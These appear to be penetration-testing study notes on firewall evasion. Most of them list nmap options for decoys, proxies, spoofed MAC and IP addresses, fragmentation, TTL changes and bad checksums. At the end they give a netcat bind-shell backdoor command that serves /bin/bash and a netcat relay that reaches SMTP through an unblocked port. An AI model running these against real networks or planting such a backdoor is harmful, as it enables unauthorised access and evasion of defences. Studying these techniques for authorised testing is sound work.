# Firewall Evasion

## Evasion via controlling the soource mac/ip/port

### Tool: nmap

### Nmap can spoof:

### 1) Decoy(s)

### 2) Proxy

### 3) Spoof MAC address

### 4) Spoofed Source IP Address

### 5) Fixed Source port number

## DECOY

### Example:

#### 

    nmap -sS -Pn -D RANDOM,RANDOM,OUR_IP -F TARGET_IP

### TIP: You can explicitly specify the random IPs in your scan

## PROXY

### Example:

#### 

    nmap -sS -Pn --proxies PROXY_URL -F TARGET_IP

### TIP: You can chain proxies using a comma separated list

## SPOOFED MAC ADDRESS

#### 

    nmap option: --spoof-mac MAC_ADDRESS

### MAC Spoofing works only if your system is on the same network segment as the target host

## SPOOFED IP ADDRESS

#### 

    nmap option: -S IP_ADDRESS

### TIP: IP Spoofing can be useful if your system is on the same subnetwork as the target host. Also you can use this technique when you control a system that has a particular IP address

## FIXED SOURCE PORT NUMBER

### Example:

#### 

    nmap -sS -Pn -g 8080 -F TARGET_IP

### TIP: Use port number like 53,80,8080,etc

# EVASION VIA FORCING FRAGMENTATION, MAXIMUM TRANSMISSION UNIT (MTU) AND DATA LENGTH 

## Fragmentation

### Tool: nmap

### Examples:

### -f = 8 bytes

### -ff = 16 bytes

#### 

    nmap -sS -Pn -ff -F TARGET_IP

## Maximum Transmission Unit MTU

#### nmap option: --mtu NUM

### TIP: Number must always be multiple of 8

## Packets with specific length

### nmap option: --data-length VALUE

#### 

    nmap -sS -Pn --data-length NUM -F TARGET_IP

### TIP: Multiple of 8

# EVASION VIA MODIFYING HEADER FIELDS

## Set Time To Live (TTL)

### option: --ttl NUM

#### 

    nmap -sS -Pn --ttl NUM -F TARGET_IP

## Set IP options

### option: --ip-options HEX_STRING

### 1 byte in hex: \xHH

### Other options:

### 1) R = to record route

### 2) T = to record timestamp

### 3) U = record route and record timestamp

### 4) L = Loose routing (Source)

### 5) S = Strict routing (Source)

## Wrong checksum

### option: --badsum

#### 

    nmap -sS -Pn --badsum -F TARGET_IP

# EVASION USING NON-STANDARD PORTS

### Backdoor example: 

    nc -lvnp PORT -e /bin/bash

### TIP: run as root to use ports below 1024 with netcat

# PORT TUNNELING/PORT MAPPING/PORT FORWARDING

### Example: 

    nc -lvnp 443 -c "nc TARGET_IP 25"

#### Access the SMTP server via a port that is not blocked by the firewall
